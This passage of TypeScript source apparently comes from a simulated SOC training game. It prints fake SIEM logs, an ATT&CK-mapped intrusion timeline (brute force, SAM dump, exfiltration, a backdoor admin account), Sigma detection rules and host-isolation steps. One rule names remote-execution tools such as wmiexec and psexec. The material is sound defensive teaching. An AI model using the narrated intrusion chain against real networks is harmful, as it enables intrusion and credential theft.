${c.red}2024-03-12 02:01:15 CRIT  auth     New domain admin created: backdoor_svc by admin@ACME${c.reset}
`

export function cmdAnalyzeLogs(__args: string[], _scenario: Scenario | null): CommandResult {
  return {
    output: `
${c.bold}${c.brightCyan}=== SIEM Log Analysis — Last 60 minutes ===${c.reset}
${c.gray}Source: /var/log/centralized/*.log | Elasticsearch${c.reset}
${SOC_LOGS}
${c.yellow}[AI-Assist] Suspicious pattern detected: Brute force → SSH success → Lateral movement → Exfiltration${c.reset}
${c.gray}Timeline spans: 01:47 to 02:01 (14 minutes total compromise window)${c.reset}

${c.yellow}💡 Log Analysis:${c.reset} ${c.gray}The logs show a classic kill chain in 14 minutes:
   SSH brute force → success → network scan → lateral movement → credential dump → exfil → persistence
   ${c.brightCyan}Defense:${c.reset}${c.gray} Enable account lockout after 5 failures. Alert on: brute force + success correlation.${c.reset}`,
    objectivesCompleted: ['obj-analyze-logs'],
  }
}

export function cmdTimeline(__args: string[], _scenario: Scenario | null): CommandResult {
  return {
    output: `
${c.bold}${c.brightCyan}=== Attack Timeline Reconstruction ===${c.reset}

${c.gray}01:47:22${c.reset} ${c.yellow}INITIAL ACCESS${c.reset}     SSH brute force begins (10.0.5.100 → .20, 8 attempts)
${c.gray}01:47:31${c.reset} ${c.brightGreen}FOOTHOLD${c.reset}           SSH login successful (admin creds compromised)
${c.gray}01:49:05${c.reset} ${c.yellow}RECONNAISSANCE${c.reset}     Internal network scan via nmap (discovery phase)
${c.gray}01:52:18${c.reset} ${c.red}LATERAL MOVEMENT${c.reset}   SMB connection to 10.0.5.30 using admin credentials
${c.gray}01:53:44${c.reset} ${c.red}EXECUTION${c.reset}          WMIExec spawned cmd.exe on .30 (remote execution)
${c.gray}01:55:01${c.reset} ${c.red}CREDENTIAL ACCESS${c.reset}  SAM database dumped (all local password hashes)
${c.gray}01:57:43${c.reset} ${c.brightRed}EXFILTRATION${c.reset}       1.2GB sent to 45.33.32.156:443 (Tor exit node)
${c.gray}02:01:15${c.reset} ${c.brightRed}PERSISTENCE${c.reset}        New domain admin account created (backdoor_svc)

${c.gray}MITRE ATT&CK Mapping:${c.reset}
${c.brightBlue}T1110.001${c.reset} ${c.gray}Brute Force: Password Guessing${c.reset}
${c.brightBlue}T1046${c.reset}     ${c.gray}Network Service Discovery${c.reset}
${c.brightBlue}T1021.002${c.reset} ${c.gray}Remote Services: SMB/Windows Admin Shares${c.reset}
${c.brightBlue}T1003.002${c.reset} ${c.gray}OS Credential Dumping: Security Account Manager${c.reset}
${c.brightBlue}T1048${c.reset}     ${c.gray}Exfiltration Over Alternative Protocol${c.reset}
${c.brightBlue}T1136.002${c.reset} ${c.gray}Create Account: Domain Account${c.reset}

${c.yellow}💡 Timeline Analysis:${c.reset} ${c.gray}MITRE ATT&CK mapping enables threat intel sharing and detection rule creation.
   Each TTP maps to specific log sources and detection opportunities.${c.reset}`,
    objectivesCompleted: ['obj-timeline'],
  }
}

export function cmdWriteRule(args: string[], _scenario: Scenario | null): CommandResult {
  const technique = args[0]?.toLowerCase() ?? 'brute-force'

  const rules: Record<string, string> = {
    'brute-force': `
${c.gray}# Sigma Rule — SSH Brute Force Detection${c.reset}
${c.brightCyan}title:${c.reset} ${c.green}SSH Brute Force Attack${c.reset}
${c.brightCyan}id:${c.reset} ${c.gray}a1b2c3d4-e5f6-7890-abcd-ef1234567890${c.reset}
${c.brightCyan}status:${c.reset} ${c.green}production${c.reset}
${c.brightCyan}description:${c.reset} ${c.gray}Detects repeated SSH authentication failures followed by success from the same source${c.reset}
${c.brightCyan}logsource:${c.reset}
${c.green}    category: authentication${c.reset}
${c.green}    product: linux${c.reset}
${c.brightCyan}detection:${c.reset}
${c.green}    brute_force:${c.reset}
${c.green}        EventID: 4625${c.reset}
${c.green}        count(EventID) > 5 within 60s${c.reset}
${c.green}    success_after_failure:${c.reset}
${c.green}        EventID: 4624${c.reset}
${c.green}        preceded_by: brute_force${c.reset}
${c.green}    condition: success_after_failure${c.reset}
${c.brightCyan}falsepositives:${c.reset}
${c.gray}    - Legitimate users mistyping passwords${c.reset}
${c.brightCyan}level:${c.reset} ${c.red}high${c.reset}`,

    'lateral': `
${c.gray}# Sigma Rule — Pass-the-Hash / Lateral Movement${c.reset}
${c.brightCyan}title:${c.reset} ${c.green}Suspicious SMB Lateral Movement${c.reset}
${c.brightCyan}detection:${c.reset}
${c.green}    new_smb_connection:${c.reset}
${c.green}        EventID: 4624${c.reset}
${c.green}        LogonType: 3  # Network logon${c.reset}
${c.green}        AuthPackage: NTLM${c.reset}
${c.green}    followed_by:${c.reset}
${c.green}        EventID: 4688  # Process creation${c.reset}
${c.green}        ParentImage: wmiexec|psexec|smbexec${c.reset}
${c.brightCyan}level:${c.reset} ${c.red}critical${c.reset}`,

    'exfil': `
${c.gray}# Sigma Rule — Data Exfiltration Detection${c.reset}
${c.brightCyan}title:${c.reset} ${c.green}Large Outbound Transfer to External IP${c.reset}
${c.brightCyan}logsource:${c.reset}
${c.green}    category: network${c.reset}
${c.brightCyan}detection:${c.reset}
${c.green}    condition:${c.reset}
${c.green}        bytes_out > 100MB AND${c.reset}
${c.green}        destination NOT in [internal_ranges] AND${c.reset}
${c.green}        timeframe: 10m${c.reset}
${c.brightCyan}level:${c.reset} ${c.red}high${c.reset}`,
  }

  const rule = rules[technique] ?? rules['brute-force']

  return {
    output: `
${c.brightGreen}[+] Detection rule created for: ${technique}${c.reset}
${rule}

${c.yellow}💡 Sigma Rules:${c.reset} ${c.gray}Sigma is a generic SIEM rule format that can be converted to
   Splunk SPL, Elastic ESQL, Microsoft Sentinel KQL, and more.
   Real-world detection engineering uses exactly this process.
   ${c.brightCyan}Defense:${c.reset}${c.gray} Tune rules to your environment to reduce false positives.${c.reset}`,
    objectivesCompleted: ['obj-write-rule'],
  }
}

export function cmdIsolate(args: string[], _scenario: Scenario | null): CommandResult {
  const target = args[0] ?? '10.0.5.30'

  return {
    output: `
${c.brightRed}[!] INCIDENT RESPONSE — HOST ISOLATION${c.reset}

${c.gray}Isolating ${target} from network...${c.reset}
${c.gray}[1/4] Applying firewall block rules: iptables -I INPUT -s ${target} -j DROP${c.reset}
${c.gray}[2/4] Applying egress block: iptables -I OUTPUT -d ${target} -j DROP${c.reset}
${c.gray}[3/4] VLAN quarantine applied (VLAN 999)${c.reset}
${c.gray}[4/4] EDR agent isolation signal sent${c.reset}

${c.brightGreen}[+] Host ${target} ISOLATED${c.reset}
${c.gray}    • Cannot communicate with rest of network${c.reset}
${c.gray}    • Management VLAN still accessible for forensics${c.reset}
${c.gray}    • Forensic preservation in progress${c.reset}

${c.yellow}⚠  Remember: Isolation ≠ Remediation${c.reset}
${c.gray}Next steps (IR playbook):
   1. Preserve memory image (volatility)
   2. Acquire disk image (dd / FTK Imager)
   3. Preserve logs (syslog, Security.evtx, PowerShell logs)
   4. Identify patient zero — how did attacker get in?
   5. Rebuild from known-good baseline
   6. Reset ALL credentials (domain-wide if DA compromised)

${c.brightCyan}Defense:${c.reset}${c.gray} Practice IR tabletops. 30-min isolation SLA is industry standard.${c.reset}`,
    objectivesCompleted: ['obj-isolate'],
  }
}
